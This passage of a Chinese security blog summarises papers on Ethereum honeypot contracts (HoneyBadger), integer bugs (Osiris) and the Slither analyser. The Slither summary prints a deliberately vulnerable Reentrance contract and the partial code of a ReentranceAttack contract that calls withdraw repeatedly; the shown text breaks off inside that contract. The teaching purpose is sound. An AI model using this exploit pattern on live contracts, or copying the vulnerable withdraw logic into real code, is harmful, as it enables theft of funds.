Update</h4><p>隐藏状态更新；除正常交易外，Etherscan还显示所谓的内部消息，这些消息是源自其他合约而非用户帐户的交易。但是Etherscan不显示包含空交易值的内部消息。下图中余额被传递给能够猜出计算存储散列的正确值的人。</p><p>贪婪的用户尝试调用未受保护的SetPass函数，该函数允许使用已知值重写哈希，前提是至少有1个以太币被传输到合约。在分析Etherscan上的内部消息时，用户将找不到调用pashasbeenset函数的任何证据，因此假设pashasbeenset设置为false。但是，为了无声地更新变量passHasBeenSet的状态，蜜罐创建者利用Etherscan执行的过滤，从另一个合约调用函数passHasBeenSet并使用空交易值。因此，通过查看显示在Etherscan上的内部消息，不知情的用户会认为变量设置为false，并放大胆地将以太币传输到SetPass函数。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201113214654.png" alt="image-20201113214654700"></p><center>Figure 7: An example of a hidden state update honeypot.<h4 id="2-3-7-Hidden-Transfer"><a href="#2-3-7-Hidden-Transfer" class="headerlink" title="2.3.7 Hidden Transfer"></a>2.3.7 Hidden Transfer</h4><p>隐藏转移；Etherscan在一个HTML textarea元素中显示源代码，在这个元素中，较大的代码行将只显示到一定的宽度，而代码行的其余部分将被隐藏并单独可见。下面的的合约利用了这个“特性”，在函数drawall的第4行引入了一长串空白，有效地隐藏了下面的代码。如果函数的调用方不是所有者，则隐藏代码将抛出，从而阻止随后向函数的任何调用方传递余额。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201113214719.png" alt="image-20201113214718962"></p><p>Figure 8: An example of a hidden transfer honeypot.</p><h4 id="2-3-8-Straw-Man-Contract"><a href="#2-3-8-Straw-Man-Contract" class="headerlink" title="2.3.8 Straw Man Contract"></a>2.3.8 Straw Man Contract</h4><p>稻草人合约；用户需要首先调用Deposit（定金）并传输最小数量的以太币。最后，用户调用CashOut函数，该函数执行对TransferLog中存储的合约地址的调用。但是实际上蜜罐创建者没有使用合约log的地址初始化合约。相反，它是用另一个地址初始化的，而此时这个地址指向的是实现同一接口的其他合约，而如果函数AddMessage的调用方不是蜜罐创建者，则执行异常，用户执行的调用将始终失败。另一种选择，是在转移余额之前使用Delegatecall。Delegatecall允许攻击者将用户地址与其自己的地址交换，所以当从Delegatecall返回时，余额将转移给攻击者而不是用户。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201113214743.png" alt="image-20201113214743650"></p><center>Figure 9: An example of a straw man contract honeypot.<h2 id="三、设计实现"><a href="#三、设计实现" class="headerlink" title="三、设计实现"></a>三、设计实现</h2><h3 id="3-1-HONEYBADGER"><a href="#3-1-HONEYBADGER" class="headerlink" title="3.1 HONEYBADGER"></a>3.1 HONEYBADGER</h3><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201113215018.png" alt="image-20201113215001706"></p><center>Figure 10: An overview of the analysis pipeline of HONEY-BADGER. The shaded boxes represent the main components.</center><p>HONEYBADGER 将EVM字节码作为输入，并返回一个关于它检测到的不同蜜罐技术的详细报告作为输出。HONEYBADGER主要由三部分组成：符号分析、现金流分析和蜜罐分析。</p><ol><li>符号分析的结果随后传播到现金流分析组件和蜜罐分析组件。</li><li>现金流分析组件使用符号分析的结果来检测合同是否能够接收和转移资金。</li><li>最后，蜜罐分析组件旨在结合启发式和符号分析的结果来检测本文研究的不同蜜罐技术。</li></ol><p>这三个组件中的每一个都使用Z3 SMT解算器来检查公式满足性（对变量取值使得某个公式成立）</p><h3 id="3-2-Implementation"><a href="#3-2-Implementation" class="headerlink" title="3.2  Implementation"></a>3.2  Implementation</h3><p>HONEYBADGERis在Python中实现，大约有4000行代码。下面简要描述每个主要组件的实现细节。</p><h4 id="3-2-1-Symbolic-Analysis"><a href="#3-2-1-Symbolic-Analysis" class="headerlink" title="3.2.1 Symbolic Analysis"></a>3.2.1 Symbolic Analysis</h4><p>符号分析的目的是收集各种可能有助于以后分析的信息。此信息包括存储写入的列表、执行路径<code>P</code>的列表、不可行和可行的基本块的列表、执行的乘法和加法的列表以及调用的列表<code>C</code>。一个调用由元组<code>(Cr，Cv，Cf，Ca，Ct，Cg)</code>组成，其中<code>Cr</code>是接收者，<code>Cv</code>是调用值，<code>Cf</code>是被调用的合约函数，<code>Ca</code>是函数参数列表，<code>Ct</code>是调用类型（即调用或委托调用），<code>Cg</code>是调用的矿工费。</p><h4 id="3-2-2-Cash-Flow-Analysis"><a href="#3-2-2-Cash-Flow-Analysis" class="headerlink" title="3.2.2 Cash Flow Analysis"></a>3.2.2 Cash Flow Analysis</h4><p>蜜罐必须能够接收资金（例如受害者的投资）和转移资金（例如攻击者的赃物）。现金流分析的目的是通过排除无法接收或转移资金的合约来提高蜜獾的检测效率。编译器在编译期间添加一个检查，如果非应付函数接收到大于零的交易值，则该检查将还原交易。</p><p>基于这些观察，首先遍历P中包含的所有可能的执行路径，从而验证合约是否能够接收资金。之后，使用Z3 SMT解算器来验证在执行路径p的给定路径条件下，约束<code>Iv&gt;0</code>(交易值大于0)是否可以满足，如果p满足约束，便可知资金可以流入合约。同时通过遍历C中包含的所有调用并检查是否存在调用C（其中Cv是符号的或Cv&gt;0）以及遍历P中包含的所有执行路径并检查是否存在以自毁方式终止的执行路径P。如果找到至少一个满足上述条件的调用C或执行路径p，资金可能流出合约。</p><h4 id="3-2-3-Honeypot-Analysis"><a href="#3-2-3-Honeypot-Analysis" class="headerlink" title="3.2.3 Honeypot Analysis"></a>3.2.3 Honeypot Analysis</h4><p>蜜罐分析包括几个子组件。每个子组件负责检测特定的蜜罐技术。每种蜜罐技术都是通过试探法来确定的，下面描述每个子组件的实现</p><p>1、平衡紊乱</p><p>遍历调用列表C中包含的所有调用，如果有调用符合<code>Cv=Iv+σ[Ia]b</code>，调用值=交易值（受害者打入的钱）+合约余额，则报告一个平衡紊乱。</p><p>2、遗传障碍</p><p>在字节码级别检测继承无序相当困难，因为字节码不包含有关继承的信息。因此，我们利用特定于此蜜罐技术的实现细节：一是存在一个写入存储位置的<code>Is</code>（用于诱骗受害者）；二是存在一个调用C，其路径条件包含<code>Is</code>和存储变量之间的比较，其存储位置不同于1中标识的存储位置。（这个是合约拥有者的地址）</p><p>3、跳过空字符串文本</p><p>遍历C中包含的所有调用，并检查调用C中<code>Ca</code>中的参数数是否小于<code>Cf</code>所期望的参数数，如果小于，说明中间有一个参数被略过，报告一个跳过空字串文本字节</p><p>4、类型演绎溢出</p><p>遍历C中包含的所有调用，检查调用C中是否存在Cv包含乘法或加法的结果，同时乘法或加法是通过<code>and mask</code>截断的，值为<code>0xff</code>（表示8位整数的最大值255），如果存在，这符合类型演绎溢出的现象</p><p>5、未初始化结构</p><p>使用正则表达式提取结构的存储位置，结构的第一个元素指向基本块中的存储位置，具体地讲就是调用列表C中存在一个调用C，其中Cv包含来自结构的存储位置的值，或者C的路径条件取决于结构的存储位置，那就报告一个未初始化结构</p><p>6、隐藏状态更新</p><p>遍历C中包含的所有调用并检查是否存在调用C来检测隐藏状态更新，该调用C的路径条件取决于可以通过另一个函数修改的存储值，而不是进行资金转移（源码中即使资金转移了，还是无法调用成功，因为条件不满足，这个无法满足的条件在受害者看来是满足的）。</p><p>7、隐藏转移</p><p>如果存在两个连续的调用C和C’存在于同一执行路径p上，且其调用接收者不同，满足<code>Cr∈σ[Ia]s∧Cv=σ[Ia]b，C&#39;r=Is∧C&#39;v=σ[Ia]b</code>，上报一个隐藏转移</p><p>8、稻草人合约</p><p>验证两个连续的调用c和c’是否沿着相同的执行路径p存在，其中<code>Cr =C&#39;r</code>。然后两种情况：一是C在C’之后执行，其中<code>C&#39;t=DELEGATECALL∧Cv=σ[Ia]b∧Cr=Is</code>；另一种是C在C’之前执行，其中<code>C&#39;t=CALL∧Is∈C&#39;a</code></p><h2 id="四、实验评估"><a href="#四、实验评估" class="headerlink" title="四、实验评估"></a>四、实验评估</h2><h3 id="4-1-Experimental-Setup"><a href="#4-1-Experimental-Setup" class="headerlink" title="4.1 Experimental Setup"></a>4.1 Experimental Setup</h3><p>所有实验均在具有960 GB内存的10个节点的高性能计算集群上进行，其中每个节点具有2个Intel Xeon L5640 CPU，每个CPU具有12个内核，时钟频率为2.26 GHz，运行64位Debian Jessie 8.10。</p><h3 id="4-2-实验结果"><a href="#4-2-实验结果" class="headerlink" title="4.2 实验结果"></a>4.2 实验结果</h3><p>在151935个独特的智能合约集上运行HONEYBADGER，在分析的151935份合约中，48487份被标记为现金流合约。</p><p>换言之，在分析的合约中，只有32%能够接收和发送资金。总共690个合约被确定为蜜罐，其中包括22个平衡障碍（BD）、75个继承障碍（ID）、11个跳过空字符串文字（SESL）、5个类型演绎溢出（TDO）、80个未初始化结构（US）、382个隐藏状态更新（HSU）、14个隐藏传输（HT）以及101个稻草人合约（SMC）。</p><h4 id="Validation"><a href="#Validation" class="headerlink" title="Validation"></a>Validation</h4><p>为了确认蜜獾的正确性，作者对标记为蜜罐的合约的源代码进行了手动检查。通过手动扫描源代码以确定检测到的蜜罐技术的特征来验证标记的合约。例如，如果合约被标记为平衡紊乱，则检查源代码是否包含一个函数，该函数在且仅当发送到函数的值大于或等于合约的余额时，才将合同的余额传输给调用方。</p><center>Table 2:  Number of true positives (TP), false positives (FP)and precisionp(in %) per detected honeypot technique forcontracts with source code.<p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201113215916.png" alt="image-20201113215916206"></p><p>真阳性（TP）、假阳性（FP）和精度p（in%）其中p计算为p=TP/（TP+FP），真阳性表示合同就所报告的技术而言确实是蜜罐，假阳性表示合同就所报告的技术而言不是蜜罐。</p><p>总的来说，蜜獾显示了非常高的精确度和非常低的假阳性率。分析的8个蜜罐技术中有5个达到了0%的假阳性率。</p><h4 id="Liveness"><a href="#Liveness" class="headerlink" title="Liveness"></a>Liveness</h4><p>作者使用简单的启发式方法将每个地址标记为攻击者或受害者。如果一个地址是：1）创建了蜜罐；2）是向蜜罐发送以太币的第一个地址；3）收到的以太币比实际花在蜜罐上的以太币多，则该地址会被标记为攻击者。</p><p>如果一个地址没有被标记为攻击者，并且收到的以太币少于在蜜罐上实际花费的以太币，则该地址被标记为受害者。最后，利用这些信息判断蜜罐是成功的、中止的还是仍然处于活动状态。如果检测到受害者，则蜜罐标记为成功；如果余额为零且未检测到受害者，则蜜罐标记为中止；如果余额大于零且未检测到受害者，则蜜罐标记为活动。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201113220417.png" alt="image-20201113220417376"></p><center>Figure 13 Number of successful, active and aborted honey-pots per honeypot technique<p>上图显示了每个蜜罐技术成功、中止和活动的蜜罐数。结果表明，跳过空字符串文字是最有效的蜜罐技术，成功率约为78%，而隐藏传输是最不有效的技术，成功率仅为33%。蜜罐的总成功率似乎很低，约为37%</p><h4 id="Profitability"><a href="#Profitability" class="headerlink" title="Profitability"></a>Profitability</h4><center>Table 3: Bytecode similarity (in %) per honeypot technique<p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201113220525.png" alt="image-20201113220525070"></p><p>作者统计了每种蜜罐技术的盈利能力。盈利能力按收到金额计算（支出金额+交易费用），最赚钱的蜜罐是稻草人合同蜜罐，平均值为1.76以太币，而最不赚钱的蜜罐是未初始化结构蜜罐，平均值为0.46以太币。</p><h2 id="五、总结评价"><a href="#五、总结评价" class="headerlink" title="五、总结评价"></a>五、总结评价</h2><p>1、论文的核心思想是利用已经检测出来的几种恶意蜜罐的技术特点，来构建一款探测蜜罐的工具，以帮助选择智能合约的客户规避陷阱。</p><p>2、工具的名字也是生动形象极具创意：HONEYBADGER（蜜獾，一种非常喜欢食用蜜的动物），工具通过三层结构来分别分析遇到的智能合约的三个方面，其中都用了Z3 SMT求解器来检查合约是否满足约束条件，三层线索层层叠加，最后判断蜜罐技术类型。</p>]]></content>
    
    
    <categories>
      
      <category>智能合约</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Smart Contract</tag>
      
      <tag>符号执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Osiris：Hunting for Integer Bugs in Ethereum Smart Contracts</title>
    <link href="/2020/113371ffa.html"/>
    <url>/2020/113371ffa.html</url>
    
    <content type="html"><![CDATA[<h1 id="Osiris：Hunting-for-Integer-Bugs-in-Ethereum-Smart-Contracts"><a href="#Osiris：Hunting-for-Integer-Bugs-in-Ethereum-Smart-Contracts" class="headerlink" title="Osiris：Hunting for Integer Bugs in Ethereum Smart Contracts"></a>Osiris：Hunting for Integer Bugs in Ethereum Smart Contracts</h1><p>论文题目：（2018-ACSAC）<a href="https://dl.acm.org/doi/abs/10.1145/3274694.3274737">Osiris: Hunting for integer bugs in ethereum smart contracts</a> ——在以太坊智能合约中寻找整数错误</p><p>论文引用：Torres C F, Schütte J, State R. Osiris: Hunting for integer bugs in ethereum smart contracts[C]//Proceedings of the 34th Annual Computer Security Applications Conference. 2018: 664-676.</p><p>代码开源：<a href="https://github.com/christoftorres/Osiris">https://github.com/christoftorres/Osiris</a></p><h2 id="一、主要内容"><a href="#一、主要内容" class="headerlink" title="一、主要内容"></a>一、主要内容</h2><p>本文的研究重点是与整数错误（integer bugs）相关的安全漏洞，这类漏洞是由以太坊虚拟机与Solidity编程语言的一些特性而导致的，所以难以避免。文章针对这类漏洞提出了OSIRIS工具，该工具是一个将==符号执行与污点分析相结合==的漏洞检测框架，旨在精确地寻找以太坊智能合约中整数错误导致的安全漏洞。</p><p>该工具针对EVM字节码自动化检测与整数错误相关的安全漏洞，目前覆盖了三种不同种类的整数错误：</p><ol><li>算术错误（arithmetic bugs）</li><li>截断错误（truncation bugs）</li><li>符号错误（signedness bugs）</li></ol><p>分析了495个以太坊代币智能合约并且在一些合约中发现了未知的安全漏洞，同时针对与整数错误相关的安全漏洞提出了对EVM与Solidity编译器的修改防护方案；本文使用OSIRIS工具对截至2018年1月所有已经部署在以太坊区块链中的智能合约进行了自动化检测，发现其中有42,108个智能合约至少存在有一种上述与整数错误相关的安全漏洞；</p><h2 id="二、设计实现"><a href="#二、设计实现" class="headerlink" title="二、设计实现"></a>二、设计实现</h2><h3 id="2-1-Background"><a href="#2-1-Background" class="headerlink" title="2.1 Background"></a>2.1 Background</h3><h4 id="2-1-1-以太坊虚拟机"><a href="#2-1-1-以太坊虚拟机" class="headerlink" title="2.1.1 以太坊虚拟机"></a>2.1.1 以太坊虚拟机</h4><p>矿工使用以太坊虚拟机（EVM）执行智能合约，EVM是用于执行EVM字节码的基于栈的虚拟机。</p><h4 id="2-1-2-Solidity编程语言"><a href="#2-1-2-Solidity编程语言" class="headerlink" title="2.1.2 Solidity编程语言"></a>2.1.2 Solidity编程语言</h4><p>Solidity的语法虽然与C和JavaScript相似，但是Solidity存在一系列专门针对智能合约开发的独有概念。Solidity是静态类型语言，整数分为有符号整数与无符号整数，宽度最低为8bit，最高为256bit。然而在EVM中，所有的整数均以256bit大端补码的形式存放。也就是说，Solidity中的整数类型系统与EVM中的整数类型系统存在不一致，这极有可能导致严重的编码错误。</p><h4 id="2-1-3-以太坊智能合约中的整数错误"><a href="#2-1-3-以太坊智能合约中的整数错误" class="headerlink" title="2.1.3 以太坊智能合约中的整数错误"></a>2.1.3 以太坊智能合约中的整数错误</h4><p>本文描述了三种类型的整数错误，这些整数错误有可能导致恶意用户窃取以太币或者更改智能合约的执行路径。</p><h5 id="算术错误"><a href="#算术错误" class="headerlink" title="算术错误"></a><strong>算术错误</strong></h5><p>算术错误包括整数上溢、整数下溢、除数为零和模数为零这四种错误。值得注意的是，EVM与Solidity针对越界行为的处理方式是不完全相同的，而且在EVM和Solidity旧版本（0.4.0之前）除数为零和模数为零只会导致运算结果为0，并不会触发异常。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201105190327.png" alt="image-20201105190327479"></p><h5 id="截断错误"><a href="#截断错误" class="headerlink" title="截断错误"></a><strong>截断错误</strong></h5><p>将一个整数类型数据转换为宽度更短的整数类型数据，可能会导致精度的丢失</p><h5 id="符号错误"><a href="#符号错误" class="headerlink" title="符号错误"></a><strong>符号错误</strong></h5><p>将一个有符号整数类型数据转换为相同宽度的无符号整数类型数据，可能会导致一个负数变为一个很大的整数（反之亦然）。</p><h3 id="2-2-METHODOLOGY"><a href="#2-2-METHODOLOGY" class="headerlink" title="2.2 METHODOLOGY"></a>2.2 METHODOLOGY</h3><h4 id="2-2-1-类型推断"><a href="#2-2-1-类型推断" class="headerlink" title="2.2.1 类型推断"></a>2.2.1 类型推断</h4><p>整数的类型信息，例如宽度和符号，通常只能从智能合约的源代码中直接获得，而不能从字节码中获得。尽管如此，通过分析Solidity编译器在编译过程中引入的代码优化规则，人们依旧能够根据特定代码优化规则从智能合约字节码中间接地推测整数的类型信息。</p><p>对于无符号整数，编译器会使用AND操作符屏蔽不在整数宽度范围内的bit，例如编译器会将uint32数据与位掩码0Xffffffff进行AND操作。</p><p>对于有符号整数，编译器会使用SIGNEXTEND操作符对数据进行符号扩展，数据的宽度可以根据SIGNEXTEND操作符的第一个参数i的值计算获得，即8 * (i + 1)。</p><h4 id="2-2-2-寻找整数错误"><a href="#2-2-2-寻找整数错误" class="headerlink" title="2.2.2 寻找整数错误"></a>2.2.2 寻找整数错误</h4><h5 id="算术错误-1"><a href="#算术错误-1" class="headerlink" title="算术错误"></a>算术错误</h5><p>对于每一条可能导致整数上溢或者整数下溢错误的算术指令，作者检查在当前的路径条件下指令是否有可能违反Table 1中所列举的各条边界检查要求，如果指令可能违反任意一条边界检查要求，则该指令存在算数错误。</p><h5 id="截断错误-1"><a href="#截断错误-1" class="headerlink" title="截断错误"></a>截断错误</h5><p>Solidity分别使用AND和SIGNEXTEND指令截断有符号整数和无符号整数。作者检查每一条AND指令和SIGNEXTEND指令的输入是否大于指令的输出，以判断指令是否存在截断错误。</p><p>此外，为了检测并忽略Solidity编译器有意引入的截断，例如address类型数据的转换以及storage中变量的压缩存储，作者还对于检测得到存在截断错误的指令进行了进一步的筛选。</p><h5 id="符号错误-1"><a href="#符号错误-1" class="headerlink" title="符号错误"></a>符号错误</h5><p>作者根据特定指令的符号限制对所有整数类型数据的符号信息进行推断。所有数据的初始标记为”Top“；如果一个数据被当做有符号整数使用过，则将该数据标记为”Signed“；如果一个数据被当做无符号整数使用过，则将该数据标记为”Unsigned“；如果一个数据既被当做有符号整数使用过，又被当做无符号整数使用过，则将该数据标记为”Bottome“，表示该整数类型数据存在符号错误。</p><h4 id="2-2-3-污点分析（Taint-Analysis）"><a href="#2-2-3-污点分析（Taint-Analysis）" class="headerlink" title="2.2.3 污点分析（Taint Analysis）"></a>2.2.3 污点分析（Taint Analysis）</h4><p>作者使用污点分析筛选掉不能被实际利用攻击的整数错误，以降低误报率：</p><ul><li>Sources：CALLDATALOAD，CALLDATACOPY；</li><li>Sinks：SSTORE，JUMPI，CALL，RETURN</li></ul><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201105190814.png" alt="image-20201105190814318"></p><h4 id="2-2-4-识别良性整数错误"><a href="#2-2-4-识别良性整数错误" class="headerlink" title="2.2.4 识别良性整数错误"></a>2.2.4 识别良性整数错误</h4><p>作者使用了一些启发式规则以识别良性的整数错误。例如，当发现整数错误是分支条件的一部分时，作者通过检查分支条件谓词的左右两边是否都使用了相同的变量，且其后的某一基本块是否是以JUMPI、REVERT或ASSERTFAIL指令结尾，以判断该分支条件谓词是否是设计用于检查该整数错误的。</p><h3 id="2-3-OSIRIS"><a href="#2-3-OSIRIS" class="headerlink" title="2.3 OSIRIS"></a>2.3 OSIRIS</h3><p>OSIRIS是在OYENTE符号执行引擎的基础上实现的，包括三个主要的组成部分：symbolic analysis、taint analysis与integer error detection。</p><ul><li>symbolic analysisi组件：构建控制流图（CFG）、符号执行智能合约的不同路径，并将每一条指令执行的结果传递给其他两个组件；</li><li>taint analysis组件：引入、传播并检查stack、memory和storage中的污点；</li><li>Integer error detection组件：检查在执行的指令中是否存在整数错误</li></ul><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201105191107.png" alt="image-20201105191107158"></p><center>Architecture overview of Osiris. The shaded boxesrepresent its main components.</center><h2 id="三、实验评估"><a href="#三、实验评估" class="headerlink" title="三、实验评估"></a>三、实验评估</h2><h3 id="3-1-Empirical-Analysis-经验分析"><a href="#3-1-Empirical-Analysis-经验分析" class="headerlink" title="3.1 Empirical Analysis(经验分析)"></a>3.1 Empirical Analysis(经验分析)</h3><h4 id="Qalitative-Analysis-定性分析"><a href="#Qalitative-Analysis-定性分析" class="headerlink" title="Qalitative Analysis(定性分析)"></a>Qalitative Analysis(定性分析)</h4><p>作者将OSIRIS工具与ZEUS工具进行了比较，发现ZEUS工具无法达到其自称的零漏报率的可靠性，相比较而言OSIRIS工具能够检测出更多的漏洞，并且具有低得多的误报率。</p><center>Comparison between ZEUS and Osiris</center><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201105191308.png" alt="image-20201105191308777"></p><h4 id="Qantitative-Analysis-定量分析"><a href="#Qantitative-Analysis-定量分析" class="headerlink" title="Qantitative Analysis(定量分析)"></a>Qantitative Analysis(定量分析)</h4><p>作者对于以太坊区块链前5,000,000个区块中的1,207,335个智能合约使用OSIRIS工具进行了大规模自动化分析。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201105191509.png" alt="image-20201105191509880"></p><center>Number of vulnerable contracts reported by Osirisper integer bug</center><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201105191525.png" alt="image-20201105191525944"></p><center>Number of vulnerable contracts per arithmetic errortype</center><h3 id="3-2-Detection-of-Real-World-Vulnerabilities"><a href="#3-2-Detection-of-Real-World-Vulnerabilities" class="headerlink" title="3.2 Detection of Real-World Vulnerabilities"></a>3.2 Detection of Real-World Vulnerabilities</h3><p>作者使用OSIRIS检测了排名前495的以太坊代币智能合约，重新检测出了已知的5个整数溢出错误导致的安全漏洞，并检测出其中例如RMC与UET等以太坊代币智能合约存在与整数错误相关的安全漏洞。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201105191837.png" alt="image-20201105191837115"></p><h2 id="四、总结评价"><a href="#四、总结评价" class="headerlink" title="四、总结评价"></a>四、总结评价</h2><ol><li>Osiris是基于Oyente开发的工具，拓展了在算术运算方面的漏洞检测率，相较于Oyente改进了一些。</li><li>Osiris工具上次更新已经是两年以前了，应该是没有再继续维护。</li></ol>]]></content>
    
    
    <categories>
      
      <category>智能合约</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Smart Contract</tag>
      
      <tag>符号执行</tag>
      
      <tag>污点分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Slither: A Static Analysis Framework For Smart</title>
    <link href="/2020/103af384f2.html"/>
    <url>/2020/103af384f2.html</url>
    
    <content type="html"><![CDATA[<h1 id="Slither-A-Static-Analysis-Framework-For-Smart"><a href="#Slither-A-Static-Analysis-Framework-For-Smart" class="headerlink" title="Slither: A Static Analysis Framework For Smart"></a>Slither: A Static Analysis Framework For Smart</h1><p>论文标题：(2019-ICSE) <a href="https://arxiv.org/abs/1908.09878">Slither: a static analysis framework for smart contracts</a> ——智能的静态分析框架</p><ul><li>补充阅读：<a href="https://blog.trailofbits.com/2019/05/27/slither-the-leading-static-analyzer-for-smart-contracts/">Slither: The Leading Static Analyzer for Smart Contracts</a></li></ul><p>论文引用：Feist J, Grieco G, Groce A. Slither: a static analysis framework for smart contracts[C]//2019 IEEE/ACM 2nd International Workshop on Emerging Trends in Software Engineering for Blockchain (WETSEB). IEEE, 2019: 8-15.</p><p>代码开源：<a href="https://github.com/crytic/slither">Slither：the Solidity source analyzer</a>，</p><h2 id="一、主要内容"><a href="#一、主要内容" class="headerlink" title="一、主要内容"></a>一、主要内容</h2><h3 id="可重入攻击介绍"><a href="#可重入攻击介绍" class="headerlink" title="可重入攻击介绍"></a>可重入攻击介绍</h3><p>可重入攻击也就是攻击方发送一笔交易，导致合约一致重复执行直到将合约账户的资源消耗完。攻击方能成功进行可重入攻击，主要依赖于Soildity为智能合约提供的==fallback和call函数==，下面先对这两个函数的功能进行介绍。</p><h4 id="Fallback-函数"><a href="#Fallback-函数" class="headerlink" title="Fallback 函数"></a>Fallback 函数</h4><p>以太坊的智能合约，可以声明一个匿名函数（unnamed function），叫做 Fallback 函数，这个函数不带任何参数，也没有返回值。当向这个合约发送消息时，如果没有找到匹配的函数就会调用 fallback 函数。比如向合约转账，但要合约接收 Ether，那么 fallback 函数必须声明为 payable，否则试图向此合约转 ETH 将失败。如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) <span class="hljs-title">payable</span> <span class="hljs-title">public</span> </span>&#123; <span class="hljs-comment">// payable 关键字，表明调用此函数，可向合约转 Ether。</span><br>&#125;<br></code></pre></td></tr></table></figure><p>向合约发送 send、transfer、call 消息时候都会调用 fallback 函数，不同的是 send 和 transfer 有 2300 gas 的限制，也就是传递给 fallback 的只有 2300 gas，这个 gas 只能用于记录日志，因为其他操作都将超过 2300 gas。但 call 则会把剩余的所有 gas 都给 fallback 函数，这有可能导致循环调用。</p><h4 id="Call函数"><a href="#Call函数" class="headerlink" title="Call函数"></a>Call函数</h4><p>call 可导致可重入攻击，当向合约转账的时候，会调用 fallback 函数，带有漏洞的合约代码如下：</p><ul><li>withdraw函数的msg.sender.call.value可能成为恶意代码攻击的地方。</li><li>如果发起交易方也是智能合约账户，当攻击方的合约账户通过调用Reentrance合约的withdraw函数进行提现的时候，由于调用call函数，将会调用攻击方合约的fallback函数；如果fallback代码再次调用Reentrance合约的withdraw函数就会形成代码可重入，将Reentrance合约账户的金额全部提走而在区块的记录仅仅提现了第一笔</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript">contract Reentrance &#123;<br>  mapping(<span class="hljs-function"><span class="hljs-params">address</span> =&gt;</span> uint) public balances;<br>    <span class="hljs-comment">// 充值</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">donate</span>(<span class="hljs-params">address _to</span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>&#123;<br>    balances[_to] += msg.value;<br>  &#125;<br>  <span class="hljs-comment">// 查看余额</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">balanceOf</span>(<span class="hljs-params">address _who</span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint balance</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> balances[_who];<br>  &#125;<br>  <span class="hljs-comment">// 提现</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params">uint _amount</span>) <span class="hljs-title">public</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;<br>      <span class="hljs-keyword">if</span>(msg.sender.call.value(_amount)()) &#123; <span class="hljs-comment">//造成可重入攻击的代码</span><br>        _amount;<br>      &#125;<br>      balances[msg.sender] -= _amount;<br>    &#125;<br>  &#125;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>攻击方的合约代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript">contract ReentranceAttack&#123;<br>  Reentrance entrance;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ReentranceAttack</span>(<span class="hljs-params">address _target</span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>&#123;<br>    entrance = Reentrance(_target);<br>  &#125;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span></span>&#123;<br>      entrance.donate.value(msg.value);<br>  &#125;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span></span>&#123;<br>    entrance.withdraw(<span class="hljs-number">0.5</span> ether);<br>    entrance.withdraw(<span class="hljs-number">0.5</span> ether);<br>  &#125;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span></span>&#123;<br>   <span 